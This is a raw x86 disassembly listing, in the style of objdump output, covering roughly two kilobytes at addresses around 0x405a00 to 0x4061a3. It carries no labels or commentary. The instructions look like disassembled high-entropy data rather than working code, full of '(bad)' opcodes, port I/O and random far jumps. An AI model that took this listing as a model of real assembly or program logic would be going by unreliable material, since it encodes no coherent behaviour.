  4059ed:	pop    ds
  4059ee:	xor    DWORD PTR [ebx-0x28],0xe065d503
  4059f5:	outs   dx,BYTE PTR ds:[esi]
  4059f6:	int3   
  4059f7:	das    
  4059f8:	mov    ?,WORD PTR [edi-0x301ea6]
  4059fe:	cli    
  4059ff:	repz add eax,0xbe96eec7
  405a05:	push   0xffffff86
  405a07:	call   0xd606e7c3
  405a0c:	fs adc al,dl
  405a0f:	xchg   ebx,eax
  405a10:	sti    
  405a11:	and    al,0xe7
  405a13:	jbe    0x405a5f
  405a15:	(bad)  
  405a16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a17:	mov    esp,0x14246d79
  405a1c:	add    eax,0x7d40efd1
  405a21:	jnp    0x4059d0
  405a23:	cmp    al,0x26
  405a25:	out    dx,eax
  405a26:	jno    0x4059cc
  405a28:	aas    
  405a29:	inc    DWORD PTR [ecx+ecx*1-0x2cf20eb3]
  405a30:	xor    ah,BYTE PTR [edi]
  405a32:	retf   
  405a33:	retf   0x332c
  405a36:	fs in  eax,0xc1
  405a39:	xchg   edx,eax
  405a3a:	and    DWORD PTR [eax+0xc],ebx
  405a3d:	push   ecx
  405a3e:	fyl2xp1 
  405a40:	sub    ebx,esi
  405a42:	icebp  
  405a43:	jecxz  0x405a2a
  405a45:	jb     0x405a02
  405a47:	aas    
  405a48:	adc    eax,esi
  405a4a:	retf   0xba2a
  405a4d:	cwde   
  405a4e:	out    0x1b,eax
  405a50:	adc    BYTE PTR [eax-0x51],ch
  405a53:	sbb    BYTE PTR [ebp-0x6f0b56b0],dl
  405a59:	xchg   ecx,eax
  405a5a:	cdq    
  405a5b:	mov    esp,DWORD PTR [edx+0x6db5f0c0]
  405a61:	or     eax,0xf40a50e3
  405a66:	loopne 0x405a80
  405a68:	lea    eax,[ebp-0x63]
  405a6b:	and    eax,edi
  405a6d:	jmp    0x2d07:0x8bc39e48
  405a74:	inc    esi
  405a75:	in     al,0x6e
  405a77:	bound  edx,QWORD PTR [edx+0x66]
  405a7a:	add    eax,0x64679397
  405a7f:	jmp    0x568971eb
  405a84:	imul   edx,ebp,0xffffff8a
  405a87:	ror    BYTE PTR [eax],1
  405a89:	cmc    
  405a8a:	in     eax,dx
  405a8b:	aas    
  405a8c:	das    
  405a8d:	cmp    eax,0x1132e0a4
  405a92:	pop    esi
  405a93:	retf   0x7196
  405a96:	ds in  eax,0x34
  405a99:	inc    esp
  405a9a:	loope  0x405a1e
  405a9c:	fld    DWORD PTR [ebp+0x79fe229f]
  405aa2:	sub    cl,0x9f
  405aa5:	jmp    0x405a75
  405aa7:	fild   WORD PTR [edi]
  405aa9:	sbb    al,0x3c
  405aab:	sahf   
  405aac:	fimul  DWORD PTR [eax+0x4f]
  405aaf:	aad    0xc4
  405ab1:	pop    ecx
  405ab2:	mov    ebx,0x14562bfd
  405ab7:	cwde   
  405ab8:	fnstsw WORD PTR [edx+0x5df92373]
  405abe:	xchg   esp,eax
  405abf:	xchg   ecx,eax
  405ac0:	out    0xe5,eax
  405ac2:	xchg   ebp,eax
  405ac3:	inc    edx
  405ac4:	rol    DWORD PTR [eax-0x38649a85],1
  405aca:	mov    ds:0x4351a5a6,al
  405acf:	punpcklwd mm0,DWORD PTR [edi]
  405ad2:	out    0xa2,eax
  405ad4:	mov    edi,0x81f535a6
  405ad9:	sbb    eax,0x21fae357
  405ade:	xlat   BYTE PTR ds:[ebx]
  405adf:	int    0x86
  405ae1:	ss jb  0x405a82
  405ae4:	std    
  405ae5:	retf   
  405ae6:	inc    ecx
  405ae7:	add    eax,0x44238e64
  405aec:	pavgb  mm4,QWORD PTR [ecx]
  405aef:	in     al,dx
  405af0:	mov    eax,0x31adc1b1
  405af5:	xor    ah,BYTE PTR [edi+eax*4]
  405af8:	mov    al,ds:0xc91a421
  405afd:	nop
  405afe:	and    BYTE PTR [edx+0x69115daf],dh
  405b04:	xchg   ebp,eax
  405b05:	xchg   ecx,eax
  405b06:	mov    BYTE PTR [ebp-0x1e],cl
  405b09:	pop    ecx
  405b0a:	pop    ebx
  405b0b:	mov    al,ds:0x890a4268
  405b10:	test   ecx,edi
  405b12:	mov    ah,0xa6
  405b14:	jne    0x405ac0
  405b16:	cmp    eax,0x7d3c9665
  405b1b:	cmc    
  405b1c:	jmp    0xdaa:0x6e772c80
  405b23:	mov    dl,0xfc
  405b25:	aas    
  405b26:	(bad)  
  405b27:	call   0xce6950d3
  405b2c:	std    
  405b2d:	test   BYTE PTR [edx],dh
  405b2f:	mov    ebp,0xf7989d51
  405b34:	add    ebp,DWORD PTR [ebp+0x79]
  405b37:	loope  0x405b09
  405b39:	pushf  
  405b3a:	dec    edx
  405b3b:	mov    edx,0x97f94d2e
  405b40:	pop    eax
  405b41:	ss or  al,0x84
  405b44:	push   esi
  405b45:	ds cld 
  405b47:	and    eax,DWORD PTR [edi]
  405b49:	mov    ecx,0x772e5e45
  405b4e:	out    0x74,eax
  405b50:	(bad)  
  405b51:	(bad)  
  405b52:	cwde   
  405b53:	xor    eax,0x98b45000
  405b58:	test   eax,0x3796efc0
  405b5d:	call   esp
  405b5f:	pop    eax
  405b60:	mov    al,ds:0x18929da1
  405b65:	out    dx,eax
  405b66:	fiadd  DWORD PTR [ebx]
  405b68:	xchg   ecx,eax
  405b69:	lods   al,BYTE PTR ds:[esi]
  405b6a:	and    DWORD PTR [ebx],esp
  405b6c:	nop
  405b6d:	loope  0x405be4
  405b6f:	sbb    edx,DWORD PTR [edi]
  405b71:	dec    ebp
  405b73:	jmpw   0x8be1
  405b77:	(bad)  
  405b78:	mov    dh,0x2b
  405b7a:	ds scas eax,DWORD PTR es:[edi]
  405b7c:	std    
  405b7d:	jp     0x405b1e
  405b7f:	xor    al,0x7f
  405b81:	loope  0x405b53
  405b83:	faddp  st(7),st
  405b85:	in     al,dx
  405b86:	xor    eax,0x6be1e696
  405b8b:	inc    edx
  405b8c:	lods   al,BYTE PTR ds:[esi]
  405b8d:	jmp    0x405baa
  405b8f:	xchg   esi,eax
  405b90:	dec    edi
  405b91:	and    eax,0x4d6a2a7b
  405b96:	inc    ebp
  405b97:	or     eax,0xef660444
  405b9c:	je     0x405b5b
  405b9e:	(bad)  [edx]
  405ba0:	scas   eax,DWORD PTR es:[edi]
  405ba1:	cmp    al,0x8f
  405ba3:	cmp    DWORD PTR [edi+eax*8],ebp
  405ba6:	mov    ds:0xf525663,eax
  405bab:	popa   
  405bac:	or     DWORD PTR [esi],ebp
  405bae:	add    BYTE PTR [eax+0x206a8548],cl
  405bb4:	mov    dh,BYTE PTR [ebx]
  405bb6:	(bad)  
  405bb7:	scas   eax,DWORD PTR es:[edi]
  405bb8:	aas    
  405bb9:	dec    edx
  405bba:	ret    
  405bbb:	mov    edx,ecx
  405bbd:	lods   al,BYTE PTR ds:[esi]
  405bbe:	ficomp WORD PTR [eax]
  405bc0:	into   
  405bc1:	push   ebx
  405bc2:	push   ebp
  405bc3:	std    
  405bc4:	sub    al,0x6a
  405bc6:	sub    DWORD PTR [ecx],edx
  405bc8:	icebp  
  405bc9:	push   eax
  405bca:	sbb    edi,DWORD PTR [ebx+edi*2+0x5fab8404]
  405bd1:	mov    ebp,DWORD PTR [ecx-0x59]
  405bd4:	daa    
  405bd5:	fs in  al,dx
  405bd7:	in     eax,0xea
  405bd9:	mov    gs,esp
  405bdb:	cld    
  405bdc:	out    dx,al
  405bdd:	xchg   ecx,eax
  405bde:	dec    ebx
  405bdf:	aad    0xef
  405be1:	jb     0x405bcb
  405be3:	xchg   ebp,edi
  405be5:	fimul  DWORD PTR [esi-0x7e3f0974]
  405beb:	fst    DWORD PTR [edi]
  405bed:	inc    eax
  405bee:	lods   al,BYTE PTR ds:[esi]
  405bef:	or     ah,ch
  405bf1:	(bad)  
  405bf2:	push   ebp
  405bf3:	jp     0x405bf3
  405bf5:	scas   al,BYTE PTR es:[edi]
  405bf6:	mov    ebp,0x579e24bb
  405bfb:	retf   0xfa13
  405bfe:	int    0x44
  405c00:	inc    ecx
  405c01:	adc    al,0x52
  405c03:	ficomp WORD PTR [edx+esi*4+0xf]
  405c07:	dec    edi
  405c08:	mov    ds,WORD PTR [edi-0x40ccaee2]
  405c0e:	ss cld 
  405c10:	gs iret 
  405c12:	into   
  405c13:	jbe    0x405c6d
  405c15:	pop    edi
  405c16:	pop    eax
  405c17:	sbb    BYTE PTR [edx-0x342cfdbd],dl
  405c1d:	icebp  
  405c1e:	mov    ds:0xac9c4057,al
  405c23:	jge    0x405c20
  405c25:	mov    edx,esi
  405c27:	mov    ch,0x27
  405c29:	push   edx
  405c2a:	or     ah,cl
  405c2c:	lods   al,BYTE PTR ds:[esi]
  405c2d:	and    DWORD PTR [eax],esp
  405c2f:	outs   dx,DWORD PTR ds:[esi]
  405c30:	sbb    al,0x5e
  405c32:	mov    dl,BYTE PTR [eax]
  405c34:	xor    esi,DWORD PTR [eax+0x5068c68]
  405c3a:	and    BYTE PTR [ebp+ecx*2+0x2e095bb7],ah
  405c41:	dec    ecx
  405c42:	add    BYTE PTR [edx],bh
  405c44:	push   edx
  405c45:	gs ret 0xa75f
  405c49:	scas   al,BYTE PTR es:[edi]
  405c4a:	faddp  st(4),st
  405c4c:	or     ah,BYTE PTR [eax+0x637c4e38]
  405c52:	dec    ebp
  405c53:	addr16 and cl,dl
  405c56:	std    
  405c57:	loope  0x405ca9
  405c59:	jbe    0x405cb0
  405c5b:	mov    esp,0x7f15b865
  405c60:	mov    esi,0xb82dd174
  405c65:	inc    ebx
  405c66:	xchg   BYTE PTR [eax],bh
  405c68:	pop    ebp
  405c69:	push   es
  405c6a:	mov    dl,0x95
  405c6c:	add    ecx,esi
  405c6e:	sbb    BYTE PTR [ebp+0x19ae6b2],0xa0
  405c75:	pop    ds
  405c76:	cmp    DWORD PTR [edi],0xd8425f
  405c7c:	je     0x405c49
  405c7e:	std    
  405c7f:	pop    ss
  405c80:	loop   0x405c9f
  405c82:	adc    dl,bh
  405c84:	addr16 sbb al,0x74
  405c87:	in     al,0x99
  405c89:	mov    ebp,0xf1586466
  405c8e:	out    0xa3,eax
  405c90:	inc    edx
  405c91:	push   esi
  405c92:	sti    
  405c93:	sbb    eax,0x5d824283
  405c98:	int3   
  405c99:	stc    
  405c9a:	add    dh,BYTE PTR [esi]
  405c9c:	int3   
  405c9d:	pop    ebp
  405c9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c9f:	push   ds
  405ca0:	or     BYTE PTR [ecx+esi*2-0x39],0x61
  405ca5:	xchg   edi,eax
  405ca6:	cli    
  405ca7:	or     BYTE PTR [edx],al
  405ca9:	(bad)  
  405caa:	mov    ecx,0x79c5a3a8
  405caf:	jp     0x405c52
  405cb1:	out    0x0,al
  405cb3:	mov    ds:0xe285f15f,al
  405cb8:	jno    0x405d0c
  405cba:	imul   ebp,DWORD PTR [ebp+edx*2-0x4e],0x1
  405cbf:	and    eax,0xf125ec16
  405cc4:	sub    edx,esp
  405cc6:	test   al,0x62
  405cc8:	mov    bh,BYTE PTR [esi-0x6e]
  405ccb:	adc    DWORD PTR [ebp-0x513b524e],esi
  405cd1:	dec    eax
  405cd2:	fs pop esp
  405cd4:	or     ch,BYTE PTR [ecx-0x40]
  405cd7:	jo     0x405c69
  405cd9:	(bad)
  405cdc:	inc    esp
  405cdd:	jl     0x405d3a
  405cdf:	xchg   esi,eax
  405ce0:	jl     0x405ce5
  405ce2:	stc    
  405ce3:	sub    ebp,DWORD PTR [edi-0x77a6a61a]
  405ce9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405cea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ceb:	stos   BYTE PTR es:[edi],al
  405cec:	fisub  DWORD PTR [ecx+0x1f586e]
  405cf2:	mul    DWORD PTR ds:0x409eb725
  405cf8:	inc    eax
  405cf9:	jmp    FWORD PTR [eax]
  405cfb:	or     eax,0x66187477
  405d00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d01:	dec    ebx
  405d02:	sub    DWORD PTR [edi],0xd8895ff8
  405d08:	pop    eax
  405d09:	out    0x3,eax
  405d0b:	(bad)  
  405d0c:	lahf   
  405d0d:	mov    WORD PTR [eax+0x53],ds
  405d10:	sub    bh,BYTE PTR [edx+ecx*2+0x704f5670]
  405d17:	sbb    bh,BYTE PTR [ecx]
  405d19:	xor    esp,ecx
  405d1b:	jnp    0x405d87
  405d1d:	mov    dh,0x64
  405d1f:	popf   
  405d20:	xor    eax,0x2d33eb72
  405d25:	or     eax,0x7032b529
  405d2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d2b:	call   0x172939cf
  405d30:	mov    esi,DWORD PTR [eax-0x6a]
  405d33:	punpcklbw mm4,DWORD PTR [edi]
  405d36:	jns    0x405d1e
  405d38:	mov    bl,0xc2
  405d3a:	js     0x405d80
  405d3c:	push   es
  405d3d:	stc    
  405d3e:	and    ecx,DWORD PTR [edi-0x6c39b866]
  405d44:	cmp    DWORD PTR [ecx-0x33ef3b38],edi
  405d4a:	mov    bl,0x6b
  405d4c:	js     0x405da4
  405d4e:	(bad)  
  405d4f:	scas   al,BYTE PTR es:[edi]
  405d50:	test   eax,0x9fbfb624
  405d55:	xchg   edx,eax
  405d56:	pop    ecx
  405d57:	xor    BYTE PTR [ecx+ebx*8+0x46],ch
  405d5b:	cmp    DWORD PTR [edi],esp
  405d5d:	sub    al,0x4e
  405d5f:	and    ebp,DWORD PTR [edi-0x6f]
  405d62:	add    ch,BYTE PTR [edi]
  405d64:	jmp    0x405d07
  405d66:	push   0xaf00f65f
  405d6b:	dec    esi
  405d6c:	dec    ebp
  405d6d:	arpl   WORD PTR [edx+edi*8+0x3337cd82],cx
  405d74:	push   ebp
  405d75:	mov    ds:0x46924bda,eax
  405d7a:	mov    DWORD PTR [eax],edx
  405d7c:	sti    
  405d7d:	aas    
  405d7e:	sti    
  405d7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d80:	dec    esp
  405d81:	pop    esp
  405d82:	aam    0x25
  405d84:	sub    BYTE PTR [edx],cl
  405d86:	call   0xd50b84a5
  405d8b:	dec    esp
  405d8c:	aam    0xad
  405d8e:	outs   dx,BYTE PTR ds:[esi]
  405d8f:	push   DWORD PTR [ebx+ebp*1+0x79]
  405d93:	mov    dl,BYTE PTR [eax+0xa217394]
  405d99:	loop   0x405e02
  405d9b:	mov    eax,DWORD PTR [eax]
  405d9d:	jle    0x405e10
  405d9f:	mov    bh,0xfd
  405da1:	mov    ch,0xb5
  405da3:	(bad)  
  405da4:	cmp    eax,0xcbb79f9
  405da9:	cmp    BYTE PTR [esi-0x32d07623],bl
  405daf:	out    dx,al
  405db0:	dec    esp
  405db1:	or     BYTE PTR [esi],al
  405db3:	sub    DWORD PTR [ecx+0xdb83556],ecx
  405db9:	add    cl,BYTE PTR [ecx+0x4]
  405dbc:	sbb    BYTE PTR [edx-0x5332dbfc],dh
  405dc2:	and    eax,0x6c9f9d27
  405dc7:	jo     0x405d62
  405dc9:	push   ds
  405dca:	ins    DWORD PTR es:[edi],dx
  405dcb:	or     BYTE PTR [ecx+0x4ee3dcd1],0xd7
  405dd2:	scas   eax,DWORD PTR es:[edi]
  405dd3:	pop    ebp
  405dd4:	sbb    BYTE PTR [edx-0x5a],ah
  405dd7:	jb     0x405d8f
  405dd9:	mov    edx,0xd4e44941
  405dde:	ror    edx,cl
  405de0:	cmp    al,0x71
  405de2:	mov    ds:0xc9638cc8,al
  405de7:	es push 0x63
  405dea:	aam    0x4b
  405dec:	test   BYTE PTR [eax+0x6e84de20],ch
  405df2:	ss xor ecx,ebx
  405df5:	lock mov edx,0x71019c8f
  405dfb:	out    0x64,eax
  405dfd:	retf   0xea82
  405e00:	pop    esi
  405e01:	sub    DWORD PTR [eax-0x27dd4da3],edx
  405e07:	or     al,0xdc
  405e09:	and    eax,0xa5c313a5
  405e0e:	xchg   ebx,eax
  405e0f:	adc    BYTE PTR [eax+0x59],ah
  405e12:	dec    edi
  405e13:	inc    eax
  405e14:	jmp    0x405e57
  405e16:	(bad)  
  405e17:	push   ebx
  405e18:	jne    0x405da1
  405e1a:	pop    edi
  405e1b:	fwait
  405e1c:	xor    al,0x8
  405e1e:	je     0x405e22
  405e20:	xor    esp,DWORD PTR [ebx+edi*8+0x6e24daf4]
  405e27:	stos   BYTE PTR es:[edi],al
  405e28:	inc    DWORD PTR [ecx]
  405e2a:	push   cs
  405e2b:	dec    ebx
  405e2c:	inc    BYTE PTR [edi-0x1d]
  405e2f:	mov    DWORD PTR es:[ebx+esi*1-0x15900319],esi
  405e37:	or     eax,0x1bacee55
  405e3c:	xor    ch,BYTE PTR [ebx]
  405e3e:	sahf   
  405e3f:	retf   0xe366
  405e42:	rcl    DWORD PTR [edi],0xf2
  405e45:	repz inc esp
  405e47:	push   ds
  405e48:	idiv   BYTE PTR [edx-0x17]
  405e4b:	mov    DWORD PTR [ebx-0x10a014d5],ebx
  405e51:	cmc    
  405e52:	inc    ebp
  405e53:	(bad)  
  405e54:	adc    ax,0x3cfa
  405e58:	push   ebp
  405e59:	adc    ebp,esp
  405e5b:	pop    esp
  405e5c:	test   BYTE PTR [ebp+0x61],dh
  405e5f:	mov    esi,0x618b99e2
  405e64:	sub    edx,esi
  405e66:	and    al,0x30
  405e68:	fnstcw WORD PTR [eax+ecx*8-0x18]
  405e6c:	mov    bh,0x58
  405e6e:	fs jmp 0x405e29
  405e71:	std    
  405e72:	stos   DWORD PTR es:[edi],eax
  405e73:	test   BYTE PTR [edi+eiz*2+0x5d],cl
  405e77:	pop    eax
  405e78:	repz sbb al,0xf8
  405e7b:	in     eax,dx
  405e7c:	adc    BYTE PTR [ecx+ebp*2-0x659be57d],0xe2
  405e84:	cmp    BYTE PTR [edx],al
  405e86:	shl    DWORD PTR [edi+0x6d],cl
  405e89:	ins    DWORD PTR es:[edi],dx
  405e8a:	push   ss
  405e8b:	adc    eax,0x35175c19
  405e90:	shl    DWORD PTR [esp+edi*8-0x9],cl
  405e94:	cld    
  405e95:	les    ebp,FWORD PTR [ebp-0x40e0db40]
  405e9b:	in     al,dx
  405e9c:	imul   esp,DWORD PTR [edx-0x55a019d4],0x3cfd637e
  405ea6:	fwait
  405ea7:	std    
  405ea8:	outs   dx,DWORD PTR ds:[esi]
  405ea9:	xor    BYTE PTR [esp+ebx*4+0x77],0x7e
  405eae:	repz rol esi,cl
  405eb1:	adc    BYTE PTR [edi-0x756d8b28],ch
  405eb7:	ret    
  405eb8:	mov    edi,0x2e372cb5
  405ebd:	out    dx,eax
  405ebe:	sti    
  405ebf:	push   ecx
  405ec0:	xor    BYTE PTR [edx+0x38c747ef],bl
  405ec6:	push   edi
  405ec7:	jno    0x405e8c
  405ec9:	leave  
  405eca:	add    dl,BYTE PTR [esi]
  405ecc:	jnp    0x405e78
  405ece:	adc    al,0xff
  405ed0:	ins    DWORD PTR es:[edi],dx
  405ed1:	loope  0x405ee9
  405ed3:	int    0x7
  405ed5:	inc    edx
  405ed6:	ins    BYTE PTR es:[edi],dx
  405ed7:	xchg   edx,eax
  405ed8:	mov    dh,0xc0
  405eda:	cmp    eax,DWORD PTR [bx-0x4]
  405ede:	shl    DWORD PTR [ecx-0x58555cb8],0x90
  405ee5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ee6:	dec    esi
  405ee7:	jns    0x405ea3
  405ee9:	xchg   esi,eax
  405eea:	push   es
  405eeb:	adc    BYTE PTR [edx-0x4e81fce5],ch
  405ef1:	das    
  405ef2:	dec    esi
  405ef3:	inc    ebp
  405ef4:	xlat   BYTE PTR ds:[ebx]
  405ef5:	pusha  
  405ef6:	in     eax,dx
  405ef7:	pop    esi
  405ef8:	out    dx,eax
  405ef9:	jle    0x405ea8
  405efb:	xchg   ecx,eax
  405efc:	arpl   WORD PTR [esi-0x19],bp
  405eff:	test   eax,0xe2fe6406
  405f04:	in     al,dx
  405f05:	mov    DWORD PTR [ebx-0x30],esi
  405f08:	fcom   QWORD PTR [esi-0x3883f845]
  405f0e:	repz mov esp,0x4113e19d
  405f14:	aaa    
  405f15:	jle    0x405efc
  405f17:	sahf   
  405f18:	(bad)  
  405f19:	cmc    
  405f1a:	cmp    eax,0x6ec85ea0
  405f1f:	stc    
  405f20:	int3   
  405f21:	clc    
  405f22:	adc    al,0x86
  405f24:	jb     0x405f54
  405f26:	push   eax
  405f27:	icebp  
  405f28:	fwait
  405f29:	shl    esp,0x4c
  405f2c:	xchg   esi,eax
  405f2d:	cdq    
  405f2e:	cld    
  405f2f:	or     bh,BYTE PTR [ecx-0x3d]
  405f32:	pop    eax
  405f33:	inc    esi
  405f34:	jne    0x405f1e
  405f36:	and    al,0xb2
  405f38:	mov    esp,0xc1dd4935
  405f3d:	push   ebx
  405f3e:	dec    ecx
  405f3f:	or     bl,bl
  405f41:	test   BYTE PTR [ecx-0x35],dl
  405f44:	fsubr  DWORD PTR ds:0x178117b9
  405f4a:	pop    ss
  405f4b:	das    
  405f4c:	mov    ebx,0x21ea563d
  405f51:	pop    edi
  405f52:	push   ds
  405f53:	enter  0xb83f,0x75
  405f57:	fmul   DWORD PTR [ebp-0x8]
  405f5a:	ret    0xa795
  405f5d:	push   eax
  405f5e:	mov    dh,0x32
  405f60:	es push 0xffffffc3
  405f63:	sub    al,0x62
  405f65:	jmp    0x5f2194ff
  405f6a:	push   0x5f
  405f6c:	mov    edi,0xc6c8f919
  405f71:	scas   eax,DWORD PTR es:[edi]
  405f72:	add    DWORD PTR [eax],ecx
  405f74:	std    
  405f75:	xor    BYTE PTR [ecx+0x1cca3d87],bl
  405f7b:	mov    al,BYTE PTR [eax]
  405f7d:	xchg   edi,eax
  405f7e:	sti    
  405f7f:	lea    eax,[eax-0x7e]
  405f82:	(bad)  
  405f83:	out    0x5,eax
  405f85:	bound  eax,QWORD PTR [ebp-0x27ab6e75]
  405f8b:	aas    
  405f8c:	cmp    ebx,0x203a36a2
  405f92:	int3   
  405f93:	or     al,0xea
  405f95:	mov    dl,0xcb
  405f97:	ficom  DWORD PTR [esp+ebp*2+0x37725dec]
  405f9e:	jne    0x405fbb
  405fa0:	(bad)  
  405fa1:	(bad)  
  405fa2:	int3   
  405fa3:	push   edi
  405fa4:	retf   0xbc31
  405fa7:	push   ds
  405fa8:	test   esi,eax
  405faa:	les    ecx,FWORD PTR [edi-0xb982eea]
  405fb0:	jmp    0x405f8e
  405fb2:	push   0xffffffe4
  405fb4:	pop    ss
  405fb5:	nop
  405fb6:	lea    di,[edx+0x36]
  405fba:	mov    dl,0x2e
  405fbc:	jmp    0x405ffe
  405fbe:	loop   0x405faa
  405fc0:	adc    al,0x0
  405fc2:	add    DWORD PTR [eax+ecx*4+0x22],esi
  405fc6:	or     al,bh
  405fc8:	mov    eax,ds:0x8e6d6e46
  405fcd:	loopne 0x406013
  405fcf:	ret    0x1748
  405fd2:	out    dx,eax
  405fd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405fd4:	dec    edi
  405fd5:	sbb    al,0x5
  405fd7:	mov    WORD PTR [ecx+0x115715a3],es
  405fdd:	stos   DWORD PTR es:[edi],eax
  405fde:	cdq    
  405fdf:	mov    DWORD PTR [eax-0x4ab6b9ce],ebx
  405fe5:	mov    esi,0xa7e889c4
  405fea:	inc    edx
  405feb:	push   ss
  405fec:	scas   eax,DWORD PTR es:[edi]
  405fed:	cmp    DWORD PTR [edx],esi
  405fef:	fs adc eax,edi
  405ff2:	xor    eax,0x42c1b583
  405ff7:	clc    
  405ff8:	pop    edi
  405ff9:	mov    dl,0x3b
  405ffb:	pop    ecx
  405ffc:	and    dl,bh
  405ffe:	fs mov ebp,0x1a3e8ec9
  406004:	ins    DWORD PTR es:[edi],dx
  406005:	jg     0x406064
  406007:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406008:	ins    DWORD PTR es:[edi],dx
  406009:	dec    esp
  40600a:	xchg   edi,esp
  40600c:	xor    BYTE PTR [eax+0x52d2e9c3],0x90
  406013:	mov    ds:0xcd3b436,al
  406018:	in     al,0xff
  40601a:	cmp    al,0x62
  40601c:	scas   al,BYTE PTR es:[edi]
  40601d:	cmp    edi,DWORD PTR [ebp+0x22cd694b]
  406023:	icebp  
  406024:	aaa    
  406025:	shr    dl,0x6d
  406028:	aaa    
  406029:	xchg   esi,eax
  40602a:	fadd   DWORD PTR ds:0x6ce04218
  406030:	jnp    0x406014
  406032:	push   si
  406034:	xor    ah,BYTE PTR [esi+0x5605ff2b]
  40603a:	ins    BYTE PTR es:[edi],dx
  40603b:	outs   dx,DWORD PTR ds:[esi]
  40603c:	arpl   WORD PTR [eax-0x6d],bp
  40603f:	das    
  406040:	mov    edx,0xd93b7048
  406045:	adc    BYTE PTR [edx+0x55e54336],0xdc
  40604c:	adc    DWORD PTR [esi-0x45],ecx
  40604f:	mov    cl,0x9e
  406051:	and    ebp,DWORD PTR [ecx-0x63d61d05]
  406057:	push   edx
  406058:	pop    ecx
  406059:	jmp    0x405fdc
  40605b:	mov    edx,0xd4f6eb19
  406060:	push   ds
  406061:	fsubr  QWORD PTR [ecx+0x48]
  406064:	loop   0x406057
  406066:	xor    ch,BYTE PTR ds:0xc9f71461
  40606c:	fs cld 
  40606e:	into   
  40606f:	pop    eax
  406070:	pop    edi
  406071:	pusha  
  406072:	xchg   esp,eax
  406073:	sar    BYTE PTR [edx-0x73],cl
  406076:	scas   al,BYTE PTR es:[edi]
  406077:	inc    ecx
  406078:	or     dh,BYTE PTR [ecx+0x4ff06cd2]
  40607e:	and    eax,0xcd1baa4
  406083:	push   eax
  406084:	jnp    0x4060b4
  406086:	push   esp
  406087:	sbb    edi,ecx
  406089:	mov    ch,0xeb
  40608b:	(bad)  
  40608c:	(bad)  
  40608d:	mov    al,ds:0xa235b913
  406092:	push   ebx
  406093:	data16 daa 
  406095:	nop
  406096:	xor    dh,BYTE PTR [esi-0xd]
  406099:	mov    ah,0xd4
  40609b:	push   ebx
  40609c:	and    eax,0xfef57495
  4060a1:	sbb    ebp,esi
  4060a3:	test   BYTE PTR [eax+0xce643ec],dl
  4060a9:	inc    ebx
  4060aa:	push   ecx
  4060ab:	add    eax,0xf68dba95
  4060b0:	fwait
  4060b1:	(bad)  
  4060b2:	repz mov esp,0x1c2ab7cb
  4060b8:	mov    DWORD PTR [ebx],ebp
  4060ba:	popa   
  4060bb:	adc    eax,0x20a20844
  4060c0:	cmp    eax,0x303327f9
  4060c5:	out    0x35,al
  4060c7:	xor    dh,BYTE PTR [eax+0x2f]
  4060ca:	inc    esp
  4060cb:	cmp    ch,ch
  4060cd:	mov    ebp,0x86670686
  4060d2:	mov    ebx,0x6d2c17b7
  4060d7:	popf   
  4060d8:	data16 adc BYTE PTR [ebx+0x33],ah
  4060dc:	pop    ebx
  4060dd:	ficom  WORD PTR [eax+0x20a5a7b5]
  4060e3:	inc    esp
  4060e4:	fnstcw WORD PTR [ecx+0x6f]
  4060e7:	dec    esi
  4060e8:	outs   dx,DWORD PTR ds:[esi]
  4060e9:	enter  0x86ec,0xb7
  4060ed:	push   edx
  4060ee:	xor    cl,ah
  4060f0:	div    esp
  4060f2:	imul   edi,esp,0x2c596f2e
  4060f8:	test   BYTE PTR [eax+eax*4],bl
  4060fb:	adc    al,0x7
  4060fd:	outs   dx,BYTE PTR ds:[esi]
  4060fe:	dec    esi
  4060ff:	push   0xffffffe5
  406101:	mov    ebp,0x9936c965
  406106:	jp     0x4060cc
  406108:	inc    esp
  406109:	scas   eax,DWORD PTR es:[edi]
  40610a:	in     al,0xe8
  40610c:	ret    0xd65d
  40610f:	cmp    eax,0x8cc0d918
  406114:	scas   al,BYTE PTR es:[edi]
  406115:	and    DWORD PTR ss:[edx+0x744bff86],eax
  40611c:	repz shl BYTE PTR [ecx],1
  40611f:	jmp    FWORD PTR [eax+0x42]
  406122:	dec    edx
  406123:	pop    edx
  406124:	aam    0x46
  406126:	xchg   edi,eax
  406127:	shl    DWORD PTR [edx+ecx*1+0x7e],cl
  40612b:	call   0xd662:0x26602508
  406132:	int3   
  406133:	and    esp,ebx
  406135:	and    eax,0x9ca6f1ca
  40613a:	mov    edi,0xacd64bfd
  40613f:	test   ebx,ecx
  406141:	adc    eax,0x3aaf76d5
  406146:	pop    ds
  406147:	and    DWORD PTR ds:0xeebcc404,ebx
  40614d:	xor    al,BYTE PTR [ecx+edx*8]
  406150:	test   eax,0x70720b5c
  406155:	sub    edx,DWORD PTR ds:0x67be00bd
  40615b:	push   ebx
  40615c:	or     al,0x2c
  40615e:	push   edx
  40615f:	jo     0x406174
  406161:	xor    bl,BYTE PTR [edx+0x59a46f1d]
  406167:	xlat   BYTE PTR ds:[ebx]
  406168:	fnstsw WORD PTR [edi+0x18064f84]
  40616e:	lods   al,BYTE PTR ds:[esi]
  40616f:	ins    BYTE PTR es:[edi],dx
  406170:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406171:	fld    QWORD PTR [esi]
  406173:	cli    
  406174:	adc    ecx,esp
  406176:	pushf  
  406177:	fmul   st(5),st
  406179:	cmp    edi,eax
  40617b:	sbb    ebp,ebx
  40617d:	mov    ds:0x8ff4444d,al
  406182:	rol    BYTE PTR [ecx-0x41],0x93
  406186:	mov    WORD PTR [eax],fs
  406188:	fdiv   QWORD PTR [esi]
  40618a:	ret    0xeb63
  40618d:	mov    WORD PTR [eax-0x5d7ef347],?
  406193:	dec    edx
  406194:	jmp    0x406199
  406196:	out    dx,eax
  406197:	ds push ecx
  406199:	mov    esi,0xad0cf2e3
  40619e:	push   esp
  40619f:	and    esi,ebp
  4061a1:	js     0x40614e
  4061a3:	sub    BYTE PTR [edi+0x79438394],ah
